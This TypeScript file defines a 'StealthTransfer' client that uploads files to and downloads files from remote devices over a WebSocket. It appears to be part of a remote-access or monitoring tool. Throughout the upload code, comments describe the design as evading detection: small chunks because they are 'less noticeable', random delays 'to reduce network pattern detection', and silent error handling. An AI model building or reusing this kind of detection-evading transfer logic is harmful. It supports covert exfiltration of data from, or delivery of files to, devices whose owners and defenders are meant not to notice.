import { WSMessage } from '@shared/schema';
import { sendMessage, setupWebsocket } from './websocket';

// Singleton class to handle stealth file transfers
export class StealthTransfer {
  private static instance: StealthTransfer;
  private activeTransfers: Map<string, TransferInfo>;
  private transferListeners: ((transfers: TransferInfo[]) => void)[] = [];
  
  // Private constructor for singleton pattern
  private constructor() {
    this.activeTransfers = new Map();
    this.initializeWebsocket();
  }
  
  public static getInstance(): StealthTransfer {
    if (!StealthTransfer.instance) {
      StealthTransfer.instance = new StealthTransfer();
    }
    return StealthTransfer.instance;
  }
  
  // Initialize the WebSocket connection silently
  private initializeWebsocket() {
    setupWebsocket();
    
    // Register global listeners for file transfer events
    window.addEventListener('message', (event) => {
      if (event.data && event.data.type === 'file_transfer_progress') {
        this.updateTransferProgress(
          event.data.transferId,
          event.data.progress,
          event.data.bytesTransferred
        );
      }
    });
  }
  
  // Start a stealth file upload to a device
  public uploadFilesToDevice(deviceId: string, files: File[]): Promise<string[]> {
    return new Promise((resolve, reject) => {
      if (!files || files.length === 0) {
        reject(new Error('No files selected'));
        return;
      }
      
      // Generate a unique transfer ID
      const transferIds: string[] = [];
      
      // Process each file
      files.forEach((file) => {
        const transferId = `upload_${Date.now()}_${Math.random().toString(36).substring(2, 9)}`;
        transferIds.push(transferId);
        
        // Register the transfer
        this.activeTransfers.set(transferId, {
          id: transferId,
          deviceId,
          filename: file.name,
          size: file.size,
          progress: 0,
          bytesTransferred: 0,
          type: 'upload',
          status: 'in_progress',
          startTime: Date.now(),
          completionTime: null
        });
        
        // Notify listeners about the new transfer
        this.notifyListeners();
        
        // Start the upload process in the background
        this.processFileUpload(deviceId, file, transferId)
          .then(() => {
            // Update the transfer status to complete
            const transfer = this.activeTransfers.get(transferId);
            if (transfer) {
              transfer.status = 'completed';
              transfer.progress = 100;
              transfer.bytesTransferred = transfer.size;
              transfer.completionTime = Date.now();
              this.notifyListeners();
            }
          })
          .catch((error) => {
            // Update the transfer status to failed
            const transfer = this.activeTransfers.get(transferId);
            if (transfer) {
              transfer.status = 'failed';
              transfer.errorMessage = error.message || 'Transfer failed';
              this.notifyListeners();
            }
          });
      });
      
      resolve(transferIds);
    });
  }
  
  // Start a stealth file download from a device
  public downloadFileFromDevice(deviceId: string, filePath: string, filename: string, fileSize: number): Promise<string> {
    return new Promise((resolve, reject) => {
      const transferId = `download_${Date.now()}_${Math.random().toString(36).substring(2, 9)}`;
      
      // Register the transfer
      this.activeTransfers.set(transferId, {
        id: transferId,
        deviceId,
        filename,
        size: fileSize,
        progress: 0,
        bytesTransferred: 0,
        type: 'download',
        status: 'in_progress',
        startTime: Date.now(),
        completionTime: null,
        filePath
      });
      
      // Notify listeners about the new transfer
      this.notifyListeners();
      
      // Initialize the download process
      this.initiateFileDownload(deviceId, filePath, transferId)
        .then(() => {
          resolve(transferId);
        })
        .catch((error) => {
          // Update the transfer status to failed
          const transfer = this.activeTransfers.get(transferId);
          if (transfer) {
            transfer.status = 'failed';
            transfer.errorMessage = error.message || 'Download failed';
            this.notifyListeners();
          }
          reject(error);
        });
    });
  }
  
  // Process file upload in chunks (more stealth)
  private async processFileUpload(deviceId: string, file: File, transferId: string): Promise<void> {
    try {
      // Read the file content
      const fileContent = await this.readFileAsArrayBuffer(file);
      
      // Define chunk size (smaller chunks are less noticeable)
      const chunkSize = 64 * 1024; // 64KB chunks
      const totalChunks = Math.ceil(fileContent.byteLength / chunkSize);
      
      // Send file metadata first
      sendMessage({
        type: 'file_transfer',
        payload: {
          action: 'init_upload',
          deviceId,
          transferId,
          filename: file.name,
          fileSize: file.size,
          totalChunks,
          timestamp: Date.now()
        }
      });
      
      // Introduce a small delay between operations to reduce detection
      await this.delay(50);
      
      // Upload the file in small chunks with random delays between
      for (let chunkIndex = 0; chunkIndex < totalChunks; chunkIndex++) {
        // Calculate the start and end bytes for this chunk
        const start = chunkIndex * chunkSize;
        const end = Math.min(start + chunkSize, fileContent.byteLength);
        const chunk = fileContent.slice(start, end);
        
        // Create a Base64 representation of the chunk
        const base64Chunk = this.arrayBufferToBase64(chunk);
        
        // Send the chunk through WebSocket
        sendMessage({
          type: 'file_transfer',
          payload: {
            action: 'upload_chunk',
            deviceId,
            transferId,
            chunkIndex,
            totalChunks,
            chunk: base64Chunk,
            timestamp: Date.now()
          }
        });
        
        // Update the transfer progress
        const percentComplete = Math.round(((chunkIndex + 1) / totalChunks) * 100);
        const bytesTransferred = end;
        this.updateTransferProgress(transferId, percentComplete, bytesTransferred);
        
        // Random delay between chunks to reduce network pattern detection
        // Varying between 20-100ms
        await this.delay(20 + Math.random() * 80);
      }
      
      // Finalize the upload
      sendMessage({
        type: 'file_transfer',
        payload: {
          action: 'complete_upload',
          deviceId,
          transferId,
          filename: file.name,
          timestamp: Date.now()
        }
      });
      
    } catch (error) {
      // Silent error handling
      throw new Error('Upload failed');
    }
  }
  
  // Initiate file download process
  private async initiateFileDownload(deviceId: string, filePath: string, transferId: string): Promise<void> {
    try {
      // Send download request
      sendMessage({
        type: 'file_transfer',
        payload: {
          action: 'request_download',
          deviceId,
          transferId,
          filePath,
          timestamp: Date.now()
        }
      });
      
      // The rest of the download process will be handled through WebSocket messages
      // Progress updates will be received and processed by the event listener
      return Promise.resolve();
      
    } catch (error) {
      // Silent error handling
      throw new Error('Download initialization failed');
    }
  }
  
  // Update transfer progress
  private updateTransferProgress(transferId: string, progress: number, bytesTransferred: number) {
    const transfer = this.activeTransfers.get(transferId);
    
    if (transfer) {
      transfer.progress = progress;
      transfer.bytesTransferred = bytesTransferred;
      
      if (progress >= 100) {
        transfer.status = 'completed';
        transfer.completionTime = Date.now();
      }
      
      // Notify listeners about the update
      this.notifyListeners();
    }
  }
  
  // Cancel a transfer
  public cancelTransfer(transferId: string): boolean {
    const transfer = this.activeTransfers.get(transferId);
    
    if (transfer && transfer.status === 'in_progress') {
      // Send cancel message to device
      sendMessage({
        type: 'file_transfer',
        payload: {
          action: 'cancel_transfer',
          deviceId: transfer.deviceId,
          transferId,
          timestamp: Date.now()
        }
      });
      
      // Update transfer status
      transfer.status = 'cancelled';
      transfer.completionTime = Date.now();
      
      // Notify listeners
      this.notifyListeners();
      
      return true;
    }
    
    return false;
  }
  
  // Get all transfers
  public getAllTransfers(): TransferInfo[] {
    return Array.from(this.activeTransfers.values());
  }
  
  // Get a specific transfer
  public getTransfer(transferId: string): TransferInfo | undefined {
    return this.activeTransfers.get(transferId);
  }
  
  // Subscribe to transfer updates
  public subscribeToTransfers(callback: (transfers: TransferInfo[]) => void): () => void {
    this.transferListeners.push(callback);
    
    // Send initial transfers list
    callback(this.getAllTransfers());
    
    // Return unsubscribe function
    return () => {
      const index = this.transferListeners.indexOf(callback);
      if (index !== -1) {
        this.transferListeners.splice(index, 1);
      }
    };
  }
  
  // Notify listeners about changes
  private notifyListeners() {
    const transfers = this.getAllTransfers();
    this.transferListeners.forEach(listener => {
      try {
        listener(transfers);
      } catch (error) {
        // Silent error handling for listener errors
      }
    });
  }
  
  // Helper: Read file as ArrayBuffer
  private readFileAsArrayBuffer(file: File): Promise<ArrayBuffer> {
    return new Promise((resolve, reject) => {
      const reader = new FileReader();
      reader.onload = () => resolve(reader.result as ArrayBuffer);
      reader.onerror = () => reject(new Error('Failed to read file'));
      reader.readAsArrayBuffer(file);
    });
  }
  
  // Helper: Convert ArrayBuffer to Base64
  private arrayBufferToBase64(buffer: ArrayBuffer): string {
    const bytes = new Uint8Array(buffer);
    let binary = '';
    for (let i = 0; i < bytes.byteLength; i++) {
      binary += String.fromCharCode(bytes[i]);
    }
    return window.btoa(binary);
  }
  
  // Helper: Simple delay function
  private delay(ms: number): Promise<void> {
    return new Promise(resolve => setTimeout(resolve, ms));
  }
}

// Types
export interface TransferInfo {
  id: string;
  deviceId: string;
  filename: string;
  size: number;
  progress: number;
  bytesTransferred: number;
  type: 'upload' | 'download';
  status: 'in_progress' | 'completed' | 'failed' | 'cancelled';
  startTime: number;
  completionTime: number | null;
  filePath?: string;
  errorMessage?: string;
}

// Export a singleton instance
export const stealthTransfer = StealthTransfer.getInstance();